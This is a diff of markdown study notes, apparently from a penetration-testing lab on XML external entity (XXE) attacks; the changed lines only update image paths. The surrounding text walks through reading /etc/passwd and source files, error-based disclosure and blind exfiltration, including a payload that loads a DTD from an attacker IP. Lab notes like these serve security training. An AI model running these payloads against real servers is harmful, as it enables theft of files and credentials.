@@ -16,17 +16,17 @@ Furthermore, some characters are used as part of an XML document structure, like
 
 The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. We can start the exercise at the end of this section, which has a `Contact Form`:
 
-<figure><img src="../../../.gitbook/assets/image (1071).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>
 
 If we fill the contact form and click on `Send Data`, then intercept the HTTP request with Burp, we get the following request:
 
-<figure><img src="../../../.gitbook/assets/image (1072).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (195).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, the form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.
 
 If we send the form without any modification, we get the following message:
 
-<figure><img src="../../../.gitbook/assets/image (1073).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>
 
 We see that the value of the `email` element is being displayed back to us on the page. To print the content of an external file to the page, we should `note which elements are being displayed, such that we know which elements to inject into`. In some cases, no elements may be displayed, which we will cover how to exploit in the upcoming sections.
 
@@ -42,7 +42,7 @@ For now, we know that whatever value we place in the `<email></email>` element g
 
 Now, we should have a new XML entity called `company`, which we can reference with `&company;`. So, instead of using our email in the `email` element, let us try using `&company;`, and see whether it will be replaced with the value we defined (`Inlane Freight`):
 
-<figure><img src="../../../.gitbook/assets/image (1074).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, the response did use the value of the entity we defined (`Inlane Freight`) instead of displaying `&company;`, indicating that we may inject XML code. In contrast, a non-vulnerable web application would display (`&company;`) as a raw value. `This confirms that we are dealing with a web application vulnerable to XXE`.
 
@@ -60,7 +60,7 @@ Now that we can define new internal XML entities let's see if we can define exte
 
 Let us now send the modified request and see whether the value of our external XML entity gets set to the file we reference:
 
-<figure><img src="../../../.gitbook/assets/image (1075).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>
 
 We see that we did indeed get the content of the `/etc/passwd` file, `meaning that we have successfully exploited the XXE vulnerability to read local files`. This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an `id_rsa` SSH key of a specific user, which may grant us access to the back-end server. We can refer to the [File Inclusion / Directory Traversal](https://academy.hackthebox.com/course/preview/file-inclusion) module to see what attacks can be carried out through local file disclosure.
 
@@ -72,7 +72,7 @@ This would allow us to perform a `Whitebox Penetration Test` to unveil more vuln
 
 So, let us see if we can use the same attack to read the source code of the `index.php` file, as follows:
 
-<figure><img src="../../../.gitbook/assets/image (1076).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (199).png" alt=""><figcaption></figcaption></figure>
 
 As we can see, this did not work, as we did not get any content. This happened because `the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity`. If a file contains some of XML's special characters (e.g. `<`/`>`/`&`), it would break the external entity reference and not be used for the reference.
 
@@ -86,7 +86,7 @@ Luckily, PHP provides wrapper filters that allow us to base64 encode certain res
 
 With that, we can send our request, and we will get the base64 encoded string of the `index.php` file:
 
-<figure><img src="../../../.gitbook/assets/image (1077).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>
 
 We can select the base64 string, click on Burp's Inspector tab (on the right pane), and it will show us the decoded file. For more on PHP filters, you can refer to the [File Inclusion / Directory Traversal](https://academy.hackthebox.com/module/details/23) module.
 
@@ -163,9 +163,9 @@ This payload defines the `a0` entity as `DOS`, references it in `a1` multiple ti
 
 First, I intercept the peticion and see the body -->
 
-<figure><img src="../../../.gitbook/assets/image (1078).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (1079).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>
 
 I can see, it reflected me my email, so i wll be to identify el XXE
 
@@ -175,13 +175,13 @@ I can see, it reflected me my email, so i wll be to identify el XXE
 ]>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1080).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>
 
 Nice! now I will try it give me the /connection.php file -->
 
-<figure><img src="../../../.gitbook/assets/image (1081).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (1082).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>
 
 ## Advanced File Disclosure
 
@@ -233,7 +233,7 @@ Now, we can reference our external entity (`xxe.dtd`) and then print the `&joine
 
 Once we write our `xxe.dtd` file, host it on our machine, and then add the above lines to our HTTP request to the vulnerable web application, we can finally get the content of the `submitDetails.php` file:
 
-<figure><img src="../../../.gitbook/assets/image (1083).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>
 
 > Note: In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.
 
@@ -243,7 +243,7 @@ This trick can become very handy when the basic XXE method does not work or when
 
 First, let's try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. `<roo>` instead of `<root>`), or just reference a non-existing entity, as follows:
 
-<figure><img src="../../../.gitbook/assets/image (1084).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (208).png" alt=""><figcaption></figcaption></figure>
 
 To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:
 
@@ -266,7 +266,7 @@ Now, we can call our external DTD script, and then reference the `error` entity,
 
 Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the `/etc/hosts` file as follows:
 
-<figure><img src="../../../.gitbook/assets/image (739).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. `"file:///var/www/html/submitDetails.php"`). However, `this method is not as reliable as the previous method for reading source files`, as it may have length limitations, and certain special characters may still break it.
 
@@ -286,11 +286,11 @@ First I try with a basic CDATA but it did not work ...
 ]>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (740).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So i try an Error Based XXE, i will be to delete the heads root -->
 
-<figure><img src="../../../.gitbook/assets/image (741).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 NICE! it did not give us any error, so... create the "malware" -->
 
@@ -321,11 +321,11 @@ Then I modified the petition to refer to my hosted dtd:
 
 > NOTE: we refer to `&joined` which is the name of the entity on our hosted dtd
 
-<figure><img src="../../../.gitbook/assets/image (742).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So... It didnt work... i will try another error, i will modify the url /error/... -->
 
-<figure><img src="../../../.gitbook/assets/image (743).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So now I’ll try to generate a dtd, host it and then call it from the petition:
 
@@ -339,7 +339,7 @@ python3 -m http.server 8090
 
 > NOTE: save the previous xml into a `exploit.dtd`
 
-<figure><img src="../../../.gitbook/assets/image (744).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```xml
 <!DOCTYPE email [ 
@@ -351,7 +351,7 @@ python3 -m http.server 8090
 &remote;
 ```
 
-<figure><img src="../../../.gitbook/assets/image (745).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Blind Data Exfiltration
 
@@ -398,7 +398,7 @@ Now, to initiate our attack, we can use a similar payload to the one we used in 
 
 Then, we can send our request to the web application:
 
-<figure><img src="../../../.gitbook/assets/image (746).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content:
 
@@ -478,7 +478,7 @@ Try to use the tool to repeat other XXE methods we learned.
 
 First, I captured the request and made one tho the `/blind` endpoint:
 
-<figure><img src="../../../.gitbook/assets/image (747).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Then I tried to perform an OOB XXE. First I created a dtd where I put the content of the file I wanted to read and apply a filter to it:
 
@@ -505,6 +505,6 @@ Now i modified the petition to call the external entity and forward the output t
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE email [   <!ENTITY % remote SYSTEM "http://10.10.15.156:8000/oob_xxe.dtd">  %remote;  %oob;]><root>&content;</root>
 ```
 
-<figure><img src="../../../.gitbook/assets/image (748).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (749).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
